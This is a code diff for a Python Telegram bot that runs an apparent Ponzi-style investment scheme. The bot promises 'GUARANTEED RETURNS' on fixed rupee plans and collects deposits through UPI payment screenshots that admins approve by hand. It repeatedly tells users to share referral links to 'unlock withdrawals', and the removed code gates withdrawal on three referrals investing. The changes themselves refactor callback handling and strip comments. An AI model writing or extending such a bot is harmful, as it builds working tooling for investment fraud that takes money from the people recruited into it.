+        investment_id = create_investment(user_id, plan, amount)
+        update_wallet_balance(user_id, amount, 'subtract')
+        
+        clear_user_state(user_id)
+        
+        returns = amount * plan_info['rate']
+        maturity = amount + returns
+        profit_percentage = plan_info['rate'] * 100
+        
+        final_text = f"""
+🎉 *INVESTMENT CREATED SUCCESSFULLY!* 🎉
+
+📄 Investment ID: *#{investment_id}*
+{plan_info['emoji']} Plan: *{plan_info['name']}*
+💰 Investment: *₹{amount:,.2f}*
+🚀 Returns: *₹{returns:,.2f}* ({profit_percentage:.0f}%)
+💎 Total Maturity: *₹{maturity:,.2f}*
+📅 Duration: *{plan_info['duration']} days*
+
+🔥 *YOUR INVESTMENT IS NOW GROWING!*
+
+💡 *Remember:* 
+Share your referral link to unlock withdrawals!
+"""
+        
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🏠 DASHBOARD", callback_data='dashboard')],
+            [InlineKeyboardButton("👥 REFER FRIENDS", callback_data='referral')]
+        ])
+        
+        await send_animated_message(
+            update.message.chat.id,
+            context,
+            frames,
+            final_text,
+            keyboard
+        )
+        
+        await notify_admins_new_investment(context, investment_id, user_id, amount, plan_info['name'])
+        
+    except ValueError:
+        await update.message.reply_text("❌ Please enter a valid amount (numbers only).\nExample: 199 or 299")
+
+async def handle_unknown_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [
+        [InlineKeyboardButton("🏠 DASHBOARD", callback_data='dashboard')],
+        [
+            InlineKeyboardButton("🔥 INVEST NOW", callback_data='plans'),
+            InlineKeyboardButton("👥 REFER & EARN", callback_data='referral')
+        ],
+        [
+            InlineKeyboardButton("💰 WALLET", callback_data='wallet'),
+            InlineKeyboardButton("❓ HOW IT WORKS", callback_data='how_it_works')
+        ]
+    ]
+    
+    await update.message.reply_text(
+        "🤔 I didn't understand that.\n\n"
+        "🎯 Use the menu below to navigate:",
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+
+# ================== PHOTO HANDLER ==================
+
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle photo uploads with enhanced feedback"""
     user_id = update.effective_user.id
     user_state_data = get_user_state(user_id)
     
@@ -1087,7 +1095,6 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     try:
-        # Animated processing
         frames = [
             "📸 Uploading screenshot...",
             "🔍 Verifying payment proof...",
@@ -1140,125 +1147,170 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
             keyboard
         )
         
-        # NOTIFY ADMINS WITH ENHANCED MESSAGE
         await notify_admins_new_deposit(context, deposit_id, deposit_data, user_id)
         
     except Exception as e:
         await update.message.reply_text("❌ Error uploading screenshot. Please try again.")
 
-async def handle_investment_amount_input(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
-    """Handle investment amount input with animations"""
+# ================== CALLBACK HANDLERS ==================
+
+async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    data = query.data
     user_id = update.effective_user.id
-    state_data = get_user_state(user_id)['data']
     
-    try:
-        amount = float(text.replace('₹', '').replace(',', '').strip())
-        plan = state_data['plan']
-        plan_info = PLANS[plan]
-        
-        if amount != plan_info['min']:
-            await update.message.reply_text(
-                f"❌ For this plan, investment amount is fixed at ₹{plan_info['min']}"
-            )
-            return
-        
+    await query.answer()
+    
+    if data == 'dashboard':
+        await dashboard(update, context)
+    elif data == 'plans':
+        await investment_plans(update, context)
+    elif data == 'wallet':
+        await wallet_menu(update, context)
+    elif data == 'referral':
+        await referral_system(update, context)
+    elif data == 'add_money':
+        await add_money_flow(update, context)
+    elif data == 'how_it_works':
+        await how_it_works(update, context)
+    elif data == 'withdraw_menu':
+        await withdraw_menu(update, context)
+    elif data.startswith('deposit_'):
+        parts = data.split('_')
+        if len(parts) >= 3 and parts[1] == 'custom':
+            upi_id = '_'.join(parts[2:])
+            await handle_custom_deposit(update, context, upi_id)
+        elif len(parts) >= 3:
+            amount = int(parts[1])
+            upi_id = '_'.join(parts[2:])
+            await handle_deposit_amount(update, context, amount, upi_id)
+    elif data.startswith('copy_upi_'):
+        upi_id = data.replace('copy_upi_', '')
+        await query.answer(f"UPI ID copied: {upi_id}", show_alert=True)
+    elif data == 'copy_referral':
         user_data = get_user_data(user_id)
-        if user_data['wallet_balance'] < amount:
-            await update.message.reply_text(
-                f"❌ *Insufficient Balance!*\n\n"
-                f"💰 Your balance: ₹{user_data['wallet_balance']:,}\n"
-                f"💸 Required: ₹{amount:,}\n\n"
-                f"Add money to start earning!",
-                parse_mode='Markdown',
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("💰 ADD MONEY", callback_data='add_money')]
-                ])
-            )
-            return
-        
-        # Animated investment creation
-        frames = [
-            "🔥 Creating your investment...",
-            "💰 Calculating returns...",
-            "📈 Setting up profit tracking...",
-            "✅ Investment activated!"
-        ]
-        
-        # Create investment
-        investment_id = create_investment(user_id, plan, amount)
-        update_wallet_balance(user_id, amount, 'subtract')
-        
-        clear_user_state(user_id)
-        
-        returns = amount * plan_info['rate']
-        maturity = amount + returns
-        profit_percentage = plan_info['rate'] * 100
-        
-        final_text = f"""
-🎉 *INVESTMENT CREATED SUCCESSFULLY!* 🎉
+        await query.answer(f"Referral code copied: {user_data['referral_code']}", show_alert=True)
+    elif data.startswith('invest_'):
+        plan = data.replace('invest_', '')
+        await handle_investment_plan_selection(update, context, plan)
+    elif data.startswith('confirm_invest_'):
+        parts = data.split('_')
+        plan = parts[2]
+        amount = int(parts[3])
+        await handle_quick_invest(update, context, plan, amount)
+    elif data.startswith('approve_deposit_'):
+        deposit_id = int(data.split('_')[2])
+        await approve_deposit_request(update, context, deposit_id)
+    elif data.startswith('reject_deposit_'):
+        deposit_id = int(data.split('_')[2])
+        await reject_deposit_request(update, context, deposit_id)
+    elif data == 'admin_panel':
+        await admin_panel(update, context)
+    elif data == 'pending_deposits':
+        await show_pending_deposits(update, context)
 
-📄 Investment ID: *#{investment_id}*
-{plan_info['emoji']} Plan: *{plan_info['name']}*
-💰 Investment: *₹{amount:,.2f}*
-🚀 Returns: *₹{returns:,.2f}* ({profit_percentage:.0f}%)
-💎 Total Maturity: *₹{maturity:,.2f}*
-📅 Duration: *{plan_info['duration']} days*
+async def handle_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE, amount, upi_id):
+    user_id = update.effective_user.id
+    set_user_state(user_id, States.AWAITING_DEPOSIT_DETAILS, {'amount': amount, 'admin_upi': upi_id})
+    
+    frames = [
+        f"💰 Processing ₹{amount} deposit...",
+        "🏦 Preparing payment instructions...",
+        "✅ Ready for payment!"
+    ]
+    
+    text = f"""
+💰 *PAYMENT INSTRUCTIONS* 💰
 
-🔥 *YOUR INVESTMENT IS NOW GROWING!*
+🎯 Amount: *₹{amount}*
+🏦 UPI ID: `{upi_id}`
 
-💡 *Remember:* 
-Share your referral link to unlock withdrawals!
+🔥 *AFTER PAYMENT, SEND:*
+    
+📸 *Then send payment screenshot*
+
+⚡ *Processing time: 0-2 hours*
+✅ *Money added instantly after approval*
 """
-        
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🏠 DASHBOARD", callback_data='dashboard')],
-            [InlineKeyboardButton("👥 REFER FRIENDS", callback_data='referral')]
-        ])
-        
-        await send_animated_message(
-            update.message.chat.id,
-            context,
-            frames,
-            final_text,
-            keyboard
-        )
-        
-        # Check if user was referred and notify referrer
-        if user_data['referred_by']:
-            referrer_id = user_data['referred_by']
-            investing_count = mark_referral_invested(referrer_id, user_id, amount)
-            
-            try:
-                if investing_count == 3:
-                    await context.bot.send_message(
-                        chat_id=referrer_id,
-                        text=f"🎉 *WITHDRAWAL UNLOCKED!*\n\n"
-                             f"Your 3rd referral just invested!\n"
-                             f"💰 Amount: ₹{amount:,}\n\n"
-                             f"🔓 You can now withdraw your profits!\n"
-                             f"🎯 Cycle resets after withdrawal.",
-                        parse_mode='Markdown'
-                    )
-                else:
-                    await context.bot.send_message(
-                        chat_id=referrer_id,
-                        text=f"💰 *Referral Investment Alert!*\n\n"
-                             f"Your referral invested ₹{amount:,}\n"
-                             f"Progress: {investing_count}/3 for withdrawal unlock",
-                        parse_mode='Markdown'
-                    )
-            except:
-                pass
-        
-        # NOTIFY ADMINS
-        await notify_admins_new_investment(context, investment_id, user_id, amount, plan_info['name'])
-        
-    except ValueError:
-        await update.message.reply_text("❌ Please enter a valid amount (numbers only).\nExample: 199 or 299")
+    
+    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='wallet')]]
+    
+    await send_animated_message(
+        update.callback_query.message.chat.id,
+        context,
+        frames,
+        text,
+        InlineKeyboardMarkup(keyboard)
+    )
 
-# Handle quick investment confirmation
+async def handle_custom_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE, upi_id):
+    user_id = update.effective_user.id
+    set_user_state(user_id, States.AWAITING_CUSTOM_AMOUNT, {'admin_upi': upi_id})
+    
+    await update.callback_query.edit_message_text(
+        "💰 *Enter custom deposit amount:*\n\n"
+        "Minimum: ₹50\n"
+        "Maximum: ₹50,000\n\n"
+        "Example: 1500",
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("❌ Cancel", callback_data='add_money')]
+        ])
+    )
+
+async def handle_investment_plan_selection(update: Update, context: ContextTypes.DEFAULT_TYPE, plan):
+    user_id = update.effective_user.id
+    user_data = get_user_data(user_id)
+    plan_info = PLANS[plan]
+    
+    if user_data['wallet_balance'] < plan_info['min']:
+        await update.callback_query.edit_message_text(
+            f"❌ *Insufficient Balance!*\n\n"
+            f"Required: ₹{plan_info['min']}\n"
+            f"Your balance: ₹{user_data['wallet_balance']}\n\n"
+            f"💰 Add money to start earning!",
+            parse_mode='Markdown',
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("💰 ADD MONEY NOW", callback_data='add_money')],
+                [InlineKeyboardButton("← Back", callback_data='plans')]
+            ])
+        )
+        return
+    
+    returns_rate = plan_info['rate'] * 100
+    example_amount = plan_info['min']
+    example_returns = example_amount * plan_info['rate']
+    example_total = example_amount + example_returns
+    
+    text = f"""
+{plan_info['emoji']} *{plan_info['name']}* {plan_info['emoji']}
+
+🔥 *{returns_rate:.0f}% GUARANTEED RETURNS!*
+📅 Duration: {plan_info['duration']} days
+💰 Investment: ₹{plan_info['min']} ONLY
+
+💡 *EXAMPLE:*
+Invest: ₹{example_amount}
+Returns: ₹{example_returns}
+Total: ₹{example_total} ✨
+
+💰 *Your wallet: ₹{user_data['wallet_balance']:,.2f}*
+
+🎯 *Confirm Investment?*
+"""
+    
+    keyboard = [
+        [InlineKeyboardButton(f"💎 INVEST ₹{plan_info['min']} NOW!", callback_data=f'confirm_invest_{plan}_{plan_info["min"]}')],
+        [InlineKeyboardButton("❌ Cancel", callback_data='plans')]
+    ]
+    
+    await update.callback_query.edit_message_text(
+        text,
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+
 async def handle_quick_invest(update: Update, context: ContextTypes.DEFAULT_TYPE, plan, amount):
-    """Handle quick investment confirmation"""
     user_id = update.effective_user.id
     user_data = get_user_data(user_id)
     plan_info = PLANS[plan]
@@ -1277,7 +1329,6 @@ async def handle_quick_invest(update: Update, context: ContextTypes.DEFAULT_TYPE
         )
         return
     
-    # Create investment directly
     investment_id = create_investment(user_id, plan, amount)
     update_wallet_balance(user_id, amount, 'subtract')
     
@@ -1321,79 +1372,11 @@ Share your referral link to unlock withdrawals!
         keyboard
     )
     
-    # Handle referral rewards
-    if user_data['referred_by']:
-        referrer_id = user_data['referred_by']
-        investing_count = mark_referral_invested(referrer_id, user_id, amount)
-        
-        try:
-            if investing_count == 3:
-                await context.bot.send_message(
-                    chat_id=referrer_id,
-                    text=f"🎉 *WITHDRAWAL UNLOCKED!*\n\n"
-                         f"Your 3rd referral just invested!\n"
-                         f"💰 Amount: ₹{amount:,}\n\n"
-                         f"🔓 You can now withdraw your profits!\n"
-                         f"🎯 Cycle resets after withdrawal.",
-                    parse_mode='Markdown'
-                )
-            else:
-                await context.bot.send_message(
-                    chat_id=referrer_id,
-                    text=f"💰 *Referral Investment Alert!*\n\n"
-                         f"Your referral invested ₹{amount:,}\n"
-                         f"Progress: {investing_count}/3 for withdrawal unlock",
-                    parse_mode='Markdown'
-                )
-        except:
-            pass
-    
-    # NOTIFY ADMINS
     await notify_admins_new_investment(context, investment_id, user_id, amount, plan_info['name'])
-
-# Update handle_callbacks to include quick invest
-async def handle_callbacks_updated(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle all callback queries including quick invest"""
-    query = update.callback_query
-    data = query.data
-    user_id = update.effective_user.id
-    
-    await query.answer()
-    
-    if data.startswith('confirm_invest_'):
-        parts = data.split('_')
-        plan = parts[2]
-        amount = int(parts[3])
-        await handle_quick_invest(update, context, plan, amount)
-        return
-    
-    # Rest of the existing callback handlers...
-    await handle_callbacks(update, context)
-
-async def handle_unknown_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle unknown messages with attractive menu"""
-    keyboard = [
-        [InlineKeyboardButton("🏠 DASHBOARD", callback_data='dashboard')],
-        [
-            InlineKeyboardButton("🔥 INVEST NOW", callback_data='plans'),
-            InlineKeyboardButton("👥 REFER & EARN", callback_data='referral')
-        ],
-        [
-            InlineKeyboardButton("💰 WALLET", callback_data='wallet'),
-            InlineKeyboardButton("❓ HOW IT WORKS", callback_data='how_it_works')
-        ]
-    ]
-    
-    await update.message.reply_text(
-        "🤔 I didn't understand that.\n\n"
-        "🎯 Use the menu below to navigate:",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
 
 # ================== ADMIN FUNCTIONS ==================
 
 async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Enhanced admin panel"""
     user_id = update.effective_user.id
     if user_id not in ADMIN_IDS:
         await update.callback_query.answer("❌ Unauthorized!")
@@ -1401,7 +1384,6 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     pending_deposits = len(get_pending_deposits())
     
-    # Get total stats
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
     
@@ -1454,7 +1436,6 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def show_pending_deposits(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show pending deposits with enhanced UI"""
     user_id = update.effective_user.id
     if user_id not in ADMIN_IDS:
         return
@@ -1471,7 +1452,6 @@ async def show_pending_deposits(update: Update, context: ContextTypes.DEFAULT_TY
         )
         return
     
-    # Show first deposit with enhanced details
     deposit = deposits[0]
     text = f"""
 💰 *DEPOSIT REQUEST #{deposit['id']}*
@@ -1507,7 +1487,6 @@ Choose to approve or reject this deposit.
     )
 
 async def approve_deposit_request(update: Update, context: ContextTypes.DEFAULT_TYPE, deposit_id):
-    """Approve deposit with enhanced notifications"""
     user_id = update.effective_user.id
     if user_id not in ADMIN_IDS:
         return
@@ -1515,7 +1494,6 @@ async def approve_deposit_request(update: Update, context: ContextTypes.DEFAULT_
     approved_user_id, amount = approve_deposit(deposit_id)
     
     if approved_user_id:
-        # Animated notification to user
         frames = [
             "🔍 Payment verified!",
             "✅ Deposit approved!",
@@ -1567,7 +1545,6 @@ Choose from our BIG OPPORTUNITY plans!
         await update.callback_query.answer("❌ Error approving deposit!")
 
 async def reject_deposit_request(update: Update, context: ContextTypes.DEFAULT_TYPE, deposit_id):
-    """Reject deposit with user notification"""
     user_id = update.effective_user.id
     if user_id not in ADMIN_IDS:
         return
@@ -1609,7 +1586,6 @@ async def reject_deposit_request(update: Update, context: ContextTypes.DEFAULT_T
 # ================== NOTIFICATION FUNCTIONS ==================
 
 async def notify_admins_new_deposit(context: ContextTypes.DEFAULT_TYPE, deposit_id, deposit_data, user_id):
-    """Enhanced admin notifications for deposits"""
     user_data = get_user_data(user_id)
     
     text = f"""
@@ -1634,7 +1610,6 @@ async def notify_admins_new_deposit(context: ContextTypes.DEFAULT_TYPE, deposit_
         [InlineKeyboardButton("👑 ADMIN PANEL", callback_data='admin_panel')]
     ]
     
-    # NOTIFY BOTH ADMINS
     for admin_id in ADMIN_IDS:
         try:
             await context.bot.send_message(
@@ -1648,7 +1623,6 @@ async def notify_admins_new_deposit(context: ContextTypes.DEFAULT_TYPE, deposit_
             logger.error(f"❌ Failed to notify admin {admin_id}: {e}")
 
 async def notify_admins_new_investment(context: ContextTypes.DEFAULT_TYPE, investment_id, user_id, amount, plan_name):
-    """Enhanced admin notifications for investments"""
     user_data = get_user_data(user_id)
     
     text = f"""
@@ -1663,7 +1637,6 @@ async def notify_admins_new_investment(context: ContextTypes.DEFAULT_TYPE, inves
 💡 User is growing their wealth! 🚀
 """
     
-    # NOTIFY BOTH ADMINS
     for admin_id in ADMIN_IDS:
         try:
             await context.bot.send_message(
@@ -1679,16 +1652,14 @@ async def notify_admins_new_investment(context: ContextTypes.DEFAULT_TYPE, inves
 
 def main():
     """Main function to run the bot"""
-    # Initialize database
     init_database()
     
-    # Create application
     app = Application.builder().token(BOT_TOKEN).build()
     
     # Add handlers
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("admin", admin_panel))
-    app.add_handler(CallbackQueryHandler(handle_callbacks_updated))
+    app.add_handler(CallbackQueryHandler(handle_callbacks))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_messages))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     
